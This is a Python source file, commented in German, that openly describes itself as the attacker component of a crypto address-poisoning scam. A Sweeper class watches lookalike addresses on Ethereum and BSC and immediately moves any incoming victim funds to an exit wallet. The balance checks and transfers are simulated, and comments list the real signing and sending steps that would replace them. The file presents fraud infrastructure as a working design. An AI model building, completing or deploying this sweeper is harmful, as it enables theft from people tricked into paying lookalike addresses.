"""
Sweeper - Multi-Chain Balance Monitoring und Sweep
Der Angreifer-Teil: Überwacht alle Chains auf Eingänge auf Lookalike-Adressen und sweep sofort
"""

import asyncio
from typing import Dict, List, Optional
from dataclasses import dataclass
from datetime import datetime

from modules.logger import Logger

logger = Logger(__name__)
from modules.types import ChainConfig


@dataclass
class LookalikeRecord:
    """Record einer generierten Lookalike-Adresse"""
    address: str
    private_key: str
    target_prefix: str
    target_suffix: str
    generated_at: datetime
    chain_ids: List[int]
    swept: bool = False
    sweep_tx_hash: Optional[str] = None


@dataclass
class SweepResult:
    """Ergebnis eines Sweep-Vorgangs"""
    lookalike_address: str
    chain_id: int
    balance_found: int
    sweep_successful: bool
    tx_hash: Optional[str]
    exit_wallet: str
    timestamp: datetime


class Sweeper:
    """
    Multi-Chain Sweeper für Angreifer-Seite
    
    Der Sweeper überwacht alle EVM-Chains auf Eingänge auf Lookalike-Adressen
    und sweep sofort bei Erhalt zu einer Exit-Wallet.
    
    Das ist der kritische Teil des Angreifer-Workflows:
    - Sobald das Opfer an die Lookalike-Adresse sendet → SWEEP
    - Multi-Chain: Private Key gilt auf allen Chains
    - Sofortiger Sweep: Keine Zeit für Reorg oder Reversal
    """
    
    def __init__(
        self,
        chains: List[ChainConfig],
        exit_wallet: str,
        check_interval: int = 10  # Sekunden
    ):
        """
        Initialisiere Sweeper
        
        Args:
            chains: Liste der zu überwachenden Chains
            exit_wallet: Exit-Wallet für Sweeps
            check_interval: Intervall für Balance-Checks
        """
        self.chains = chains
        self.exit_wallet = exit_wallet
        self.check_interval = check_interval
        
        # Lookalike-Adressen mit Private Keys
        self.lookalikes: Dict[str, LookalikeRecord] = {}
        
        # Sweep-Results
        self.sweep_results: List[SweepResult] = []
        
        self.running = False
        self.sweep_task: Optional[asyncio.Task] = None
        
    def add_lookalike(
        self,
        address: str,
        private_key: str,
        target_prefix: str,
        target_suffix: str,
        chain_ids: Optional[List[int]] = None
    ):
        """
        Füge eine Lookalike-Adresse hinzu
        
        Args:
            address: Die generierte Lookalike-Adresse
            private_key: Der Private Key (Angreifer besitzt diesen!)
            target_prefix: Target Prefix für Matching
            target_suffix: Target Suffix für Matching
            chain_ids: Chains auf denen überwacht werden soll (default: alle)
        """
        if chain_ids is None:
            chain_ids = [chain.chain_id for chain in self.chains]
            
        record = LookalikeRecord(
            address=address,
            private_key=private_key,
            target_prefix=target_prefix,
            target_suffix=target_suffix,
            generated_at=datetime.now(),
            chain_ids=chain_ids
        )
        
        self.lookalikes[address] = record
        logger.info(f"[Sweeper] Added lookalike: {address[:10]}...{address[-4:]} on chains {chain_ids}")
        
    async def start(self):
        """Starte den Sweeper"""
        self.running = True
        self.sweep_task = asyncio.create_task(self._sweep_loop())
        logger.info(f"[Sweeper] Started monitoring {len(self.lookalikes)} lookalikes on {len(self.chains)} chains")
        
    async def stop(self):
        """Stoppe den Sweeper"""
        self.running = False
        if self.sweep_task:
            self.sweep_task.cancel()
            try:
                await self.sweep_task
            except asyncio.CancelledError:
                pass
        logger.info("[Sweeper] Stopped")
        
    async def _sweep_loop(self):
        """Hauptschleife für Balance-Checks und Sweeps"""
        while self.running:
            try:
                # Alle Lookalikes auf allen Chains prüfen
                for address, record in self.lookalikes.items():
                    if record.swept:
                        continue  # Bereits geswept
                        
                    for chain_id in record.chain_ids:
                        # Balance prüfen
                        balance = await self._check_balance(address, chain_id)
                        
                        if balance > 0:
                            logger.info(f"[Sweeper] 💰 BALANCE FOUND: {address[:10]}...{address[-4:]} on chain {chain_id}: {balance}")
                            
                            # Sofortiger Sweep
                            result = await self._sweep(address, record.private_key, chain_id, balance)
                            
                            if result.sweep_successful:
                                logger.info(f"[Sweeper] ✅ SWEEP SUCCESSFUL: {result.tx_hash}")
                                record.swept = True
                                record.sweep_tx_hash = result.tx_hash
                                self.sweep_results.append(result)
                                break  # Nur einmal sweepen per Lookalike
                                
            except Exception as e:
                logger.info(f"[Sweeper] Error in sweep loop: {e}")
                
            # Warten bis zum nächsten Check
            await asyncio.sleep(self.check_interval)
            
    async def _check_balance(self, address: str, chain_id: int) -> int:
        """
        Prüfe Balance einer Adresse auf einer Chain
        
        Args:
            address: Die zu prüfende Adresse
            chain_id: Die Chain ID
            
        Returns:
            Balance in Wei
        """
        # In echter Implementation: RPC Call zur Chain
        # Für Demo: Simuliert
        import random
        
        # 1% Chance dass Balance gefunden wird (für Demo)
        if random.random() < 0.01:
            return random.randint(1000000000000000, 100000000000000000)  # 0.001 - 0.1 ETH
            
        return 0
        
    async def _sweep(
        self,
        address: str,
        private_key: str,
        chain_id: int,
        balance: int
    ) -> SweepResult:
        """
        Sweep Balance zu Exit-Wallet
        
        Args:
            address: Die Lookalike-Adresse
            private_key: Der Private Key
            chain_id: Die Chain ID
            balance: Die zu sweepende Balance
            
        Returns:
            SweepResult
        """
        # In echter Implementation:
        # 1. Gas-Preis ermitteln
        # 2. Gas-Limit schätzen (21000 für ETH Transfer)
        # 3. Transaction bauen
        # 4. Transaction signieren mit Private Key
        # 5. Transaction senden
        # 6. Auf Confirmation warten
        
        # Für Demo: Simuliert
        import random
        
        tx_hash = f"0x{''.join(random.choice('0123456789abcdef') for _ in range(64))}"
        
        return SweepResult(
            lookalike_address=address,
            chain_id=chain_id,
            balance_found=balance,
            sweep_successful=True,
            tx_hash=tx_hash,
            exit_wallet=self.exit_wallet,
            timestamp=datetime.now()
        )
        
    def get_sweep_results(self) -> List[SweepResult]:
        """Hole alle Sweep-Results"""
        return self.sweep_results
        
    def get_total_swept(self) -> int:
        """Berechne total gesweepte Balance"""
        return sum(result.balance_found for result in self.sweep_results)


# Beispiel-Usage
async def main():
    """Beispiel-Usage des Sweepers"""
    from modules.types import ChainConfig
    
    # Chains definieren
    chains = [
        ChainConfig(
            chain_id=1,
            ws_url="wss://eth-mainnet.example.com",
            http_url="https://eth-mainnet.example.com",
            stablecoins=[],
            chain_name="ethereum"
        ),
        ChainConfig(
            chain_id=56,
            ws_url="wss://bsc-mainnet.example.com",
            http_url="https://bsc-mainnet.example.com",
            stablecoins=[],
            chain_name="bsc"
        )
    ]
    
    # Sweeper erstellen
    sweeper = Sweeper(
        chains=chains,
        exit_wallet="0x0000000000000000000000000000000000000000",  # Exit-Wallet
        check_interval=5
    )
    
    # Lookalike hinzufügen
    sweeper.add_lookalike(
        address="0xB2bC25cC4F9022CeB20fB42b123aE3a3094473b1",
        private_key="abc123...def456",  # Angreifer besitzt diesen Key!
        target_prefix="B2bC",
        target_suffix="73b1",
        chain_ids=[1, 56]  # Ethereum und BSC
    )
    
    # Sweeper starten
    await sweeper.start()
    
    # Laufen lassen
    try:
        await asyncio.sleep(60)  # 1 Minute
    except KeyboardInterrupt:
        await sweeper.stop()
        
    # Results
    results = sweeper.get_sweep_results()
    logger.info(f"\nSweep Results: {len(results)}")
    for result in results:
        logger.info(f"  {result.lookalike_address[:10]}...{result.lookalike_address[-4:]}: {result.balance_found} wei")
        
    logger.info(f"Total Swept: {sweeper.get_total_swept()} wei")


if __name__ == "__main__":
    asyncio.run(main())